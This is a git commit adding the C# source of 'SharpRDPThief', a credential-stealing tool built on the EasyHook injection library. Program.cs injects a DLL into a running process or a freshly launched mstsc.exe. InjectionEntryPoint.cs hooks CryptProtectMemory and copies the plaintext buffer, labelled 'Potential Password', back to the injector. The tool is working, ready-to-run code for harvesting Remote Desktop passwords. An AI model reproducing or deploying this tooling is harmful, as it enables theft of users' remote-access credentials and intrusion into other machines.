937b7a798a9d6f79c1c9be2cf5c89310a689b699
jmagri <joshua-magri@uiowa.edu>
2020-08-26 17:26:46 -0500

    Initial Commit

---
+++ RDPHook/InjectionEntryPoint.cs
@@ -0,0 +1,179 @@
+﻿// RemoteFileMonitor (File: FileMonitorHook\InjectionEntryPoint.cs)
+//
+// Copyright (c) 2017 Justin Stenning
+//
+// Permission is hereby granted, free of charge, to any person obtaining a copy
+// of this software and associated documentation files (the "Software"), to deal
+// in the Software without restriction, including without limitation the rights
+// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+// copies of the Software, and to permit persons to whom the Software is
+// furnished to do so, subject to the following conditions:
+// 
+// The above copyright notice and this permission notice shall be included in
+// all copies or substantial portions of the Software.
+// 
+// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
+// THE SOFTWARE.
+//
+// Please visit https://easyhook.github.io for more information
+// about the project, latest updates and other tutorials.
+
+using System;
+using System.Collections.Generic;
+using System.Runtime.InteropServices;
+
+namespace RDPHook
+{
+    /// <summary>
+    /// EasyHook will look for a class implementing <see cref="EasyHook.IEntryPoint"/> during injection. This
+    /// becomes the entry point within the target process after injection is complete.
+    /// </summary>
+    public class InjectionEntryPoint: EasyHook.IEntryPoint
+    {
+        /// <summary>
+        /// Reference to the server interface
+        /// </summary>
+        ServerInterface _server = null;
+
+        /// <summary>
+        /// Message queue of all files accessed
+        /// </summary>
+        Queue<string> _messageQueue = new Queue<string>();
+
+        /// <summary>
+        /// EasyHook requires a constructor that matches <paramref name="context"/> and any additional parameters as provided
+        /// in the original call to <see cref="EasyHook.RemoteHooking.Inject(int, EasyHook.InjectionOptions, string, string, object[])"/>.
+        /// 
+        /// Multiple constructors can exist on the same <see cref="EasyHook.IEntryPoint"/>, providing that each one has a corresponding Run method (e.g. <see cref="Run(EasyHook.RemoteHooking.IContext, string)"/>).
+        /// </summary>
+        /// <param name="context">The RemoteHooking context</param>
+        /// <param name="channelName">The name of the IPC channel</param>
+        public InjectionEntryPoint(
+            EasyHook.RemoteHooking.IContext context,
+            string channelName)
+        {
+            // Connect to server object using provided channel name
+            _server = EasyHook.RemoteHooking.IpcConnectClient<ServerInterface>(channelName);
+
+            // If Ping fails then the Run method will be not be called
+            _server.Ping();
+        }
+        //Need LoadLibrary to import dpapi.dll in case it hasn't been imported yet
+        [DllImport("kernel32.dll")]
+        public static extern IntPtr LoadLibrary(string dllToLoad);
+        /// <summary>
+        /// The main entry point for our logic once injected within the target process. 
+        /// This is where the hooks will be created, and a loop will be entered until host process exits.
+        /// EasyHook requires a matching Run method for the constructor
+        /// </summary>
+        /// <param name="context">The RemoteHooking context</param>
+        /// <param name="channelName">The name of the IPC channel</param>
+        public void Run(
+            EasyHook.RemoteHooking.IContext context,
+            string channelName)
+        {
+            // Injection is now complete and the server interface is connected
+            _server.IsInstalled(EasyHook.RemoteHooking.GetCurrentProcessId());
+            
+            //Install hooks
+                LoadLibrary("dpapi.dll");
+                var createCryptHook = EasyHook.LocalHook.Create(
+                EasyHook.LocalHook.GetProcAddress("dpapi.dll", "CryptProtectMemory"),
+                new CryptProtectMemory_Delegate(CryptProtectMemory_Hook),
+                this);
+            
+            
+
+            
+            // Activate hooks on all threads except the current thread
+            createCryptHook.ThreadACL.SetExclusiveACL(new Int32[] { 0 });
+
+            _server.ReportMessage("Hook in place!");
+
+            // Wake up the process (required if using RemoteHooking.CreateAndInject)
+            EasyHook.RemoteHooking.WakeUpProcess();
+
+            try
+            {
+                // Loop until program closes (i.e. IPC fails)
+                while (true)
+                {
+                    System.Threading.Thread.Sleep(500);
+
+                    string[] queued = null;
+
+                    lock (_messageQueue)
+                    {
+                        queued = _messageQueue.ToArray();
+                        _messageQueue.Clear();
+                    }
+
+                    // Send newly monitored file accesses to server
+                    if (queued != null && queued.Length > 0)
+                    {
+                        _server.ReportMessages(queued);
+                    }
+                    else
+                    {
+                        _server.Ping();
+                    }
+                }
+            }
+            catch
+            {
+                // Ping() or ReportMessages() will raise an exception if host is unreachable
+            }
+
+            // Remove hooks
+            createCryptHook.Dispose();
+
+            // Finalise cleanup of hooks
+            EasyHook.LocalHook.Release();
+        }
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]
+        delegate bool CryptProtectMemory_Delegate(IntPtr pData, uint cbData, uint dwFlags);
+        [DllImport("dpapi.dll", SetLastError = true, CallingConvention = CallingConvention.StdCall)]
+        static extern bool CryptProtectMemory(
+            IntPtr pData,
+            uint cbData,
+            uint dwFlags);
+
+        bool CryptProtectMemory_Hook(
+            IntPtr pData,
+            uint cbData,
+            uint dwFlags)
+        {
+        
+            try
+            {
+                lock (this._messageQueue)
+                {
+                    if (this._messageQueue.Count < 1000)
+                    {
+
+
+                        //Get string from memory address passed to CryptProtectMemory
+                        var password = Marshal.PtrToStringUni(pData, (int)cbData);
+                     
+                        this._messageQueue.Enqueue(
+                            string.Format("PID/ThreadID: {0}/{1}, Potential Password: {2}",
+                            EasyHook.RemoteHooking.GetCurrentProcessId(), EasyHook.RemoteHooking.GetCurrentThreadId(), password));
+                        
+                    }
+                }
+            }
+            catch
+            {
+                // swallow exceptions so that any issues caused by this code do not crash target process
+            }
+
+            return CryptProtectMemory(pData,cbData,dwFlags);
+        }
+    }
+}
---
+++ SharpRDPThief/Program.cs
@@ -0,0 +1,144 @@
+﻿// RemoteFileMonitor (File: FileMonitor\Program.cs)
+//
+// Copyright (c) 2017 Justin Stenning
+//
+// Permission is hereby granted, free of charge, to any person obtaining a copy
+// of this software and associated documentation files (the "Software"), to deal
+// in the Software without restriction, including without limitation the rights
+// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+// copies of the Software, and to permit persons to whom the Software is
+// furnished to do so, subject to the following conditions:
+// 
+// The above copyright notice and this permission notice shall be included in
+// all copies or substantial portions of the Software.
+// 
+// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
+// THE SOFTWARE.
+//
+// Please visit https://easyhook.github.io for more information
+// about the project, latest updates and other tutorials.
+
+using System;
+using System.IO;
+
+namespace SharpRDPThief
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            Int32 targetPID = 0;
+            string targetExe = null;
+
+            // Will contain the name of the IPC server channel
+            string channelName = null;
+
+            // Process command line arguments or print instructions and retrieve argument value
+            ProcessArgs(args, out targetPID, out targetExe);
+
+            if (targetPID <= 0 && string.IsNullOrEmpty(targetExe))
+                return;
+
+            // Create the IPC server using the RDPHook IPC.ServiceInterface class as a singleton
+            EasyHook.RemoteHooking.IpcCreateServer<RDPHook.ServerInterface>(ref channelName, System.Runtime.Remoting.WellKnownObjectMode.Singleton);
+
+            // Get the full path to the assembly we want to inject into the target process
+            string injectionLibrary = Path.Combine(Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location), "RDPHook.dll");
+
+            try
+            {
+                // Injecting into existing process by Id
+                if (targetPID > 0)
+                {
+                    Console.WriteLine("Attempting to inject into process {0}", targetPID);
+
+                    // inject into existing process
+                    EasyHook.RemoteHooking.Inject(
+                        targetPID,          // ID of process to inject into
+                        injectionLibrary,   // 32-bit library to inject (if target is 32-bit)
+                        injectionLibrary,   // 64-bit library to inject (if target is 64-bit)
+                        channelName         // the parameters to pass into injected library
+                                            // ...
+                    );
+                }
+                // Create a new process and then inject into it
+                else if (!string.IsNullOrEmpty(targetExe))
+                {
+                    Console.WriteLine("Attempting to create and inject into {0}", targetExe);
+                    // start and inject into a new process
+                    EasyHook.RemoteHooking.CreateAndInject(
+                        targetExe,          // executable to run
+                        "",                 // command line arguments for target
+                        0,                  // additional process creation flags to pass to CreateProcess
+                        EasyHook.InjectionOptions.DoNotRequireStrongName, // allow injectionLibrary to be unsigned
+                        injectionLibrary,   // 32-bit library to inject (if target is 32-bit)
+                        injectionLibrary,   // 64-bit library to inject (if target is 64-bit)
+                        out targetPID,      // retrieve the newly created process ID
+                        channelName         // the parameters to pass into injected library
+                                            // ...
+                    );
+                }
+            }
+            catch (Exception e)
+            {
+                Console.ForegroundColor = ConsoleColor.Red;
+                Console.WriteLine("There was an error while injecting into target:");
+                Console.ResetColor();
+                Console.WriteLine(e.ToString());
+            }
+
+            Console.ForegroundColor = ConsoleColor.DarkGreen;
+            Console.WriteLine("<Press any key to exit>");
+            Console.ResetColor();
+            Console.ReadKey();
+        }
+
+        static void ProcessArgs(string[] args, out int targetPID, out string targetExe)
+        {
+            targetPID = 0;
+            targetExe = null;
+
+            Console.WriteLine();
+            Console.ForegroundColor = ConsoleColor.DarkGreen;
+            Console.ResetColor();
+
+            // Load any parameters
+            while ((args.Length != 1) || !Int32.TryParse(args[0], out targetPID) || !File.Exists(args[0]))
+            {
+                if (targetPID > 0)
+                {
+                    break;
+                }
+                if (args.Length != 1 || !File.Exists(args[0]))
+                {
+                    Console.WriteLine("Usage: SharpRDPThief ProcessID");
+                    Console.WriteLine("   or: SharpRDPThief PathToExecutable");
+                    Console.WriteLine("");
+                    Console.WriteLine("e.g. : SharpRDPThief 1234");
+                    Console.WriteLine("          to monitor an existing process with PID 1234");
+                    Console.WriteLine(@"  or : SharpRDPThief ""C:\Windows\System32\mstsc.exe""");
+                    Console.WriteLine("          create new mstsc.exe process using RemoteHooking.CreateAndInject");
+                    Console.WriteLine();
+                    Console.WriteLine("Enter a process Id or path to executable");
+                    Console.Write("> ");
+
+                    args = new string[] { Console.ReadLine() };
+
+                    Console.WriteLine();
+
+                    if (String.IsNullOrEmpty(args[0])) return;
+                }
+                else
+                {
+                    targetExe = args[0];
+                    break;
+                }
+            }
+        }
+    }
+}
